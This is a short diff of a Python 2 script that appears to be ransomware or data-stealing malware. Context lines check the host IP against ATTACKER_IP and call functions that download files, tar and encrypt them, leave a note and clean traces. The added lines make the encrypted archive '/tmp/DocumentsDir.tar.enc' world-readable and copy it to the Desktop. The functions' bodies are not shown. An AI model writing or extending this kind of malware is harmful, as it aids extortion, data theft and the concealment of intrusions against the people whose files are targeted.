@@ -201,6 +201,8 @@ if(cmp(myIp, ATTACKER_IP) != 0):
         downloadFiles()
         createTarAndEncrypt() 
         leaveNote()
+	print(os.getcwd())
+	Popen(["chmod", "a+r", "/tmp/DocumentsDir.tar.enc"])
 	shutil.copy("/tmp/DocumentsDir.tar.enc", "/home/ubuntu/Desktop/")   
 	print("Copied Encrypted file to Desktop")
     except Exception, e:
@@ -231,4 +233,4 @@ if(cmp(myIp, ATTACKER_IP) != 0):
         cleanTraces() 
     except Exception, e:
 	print("Problem in Execution:", e)  
-print("I am done now !!")
+    print("I am done now !!")
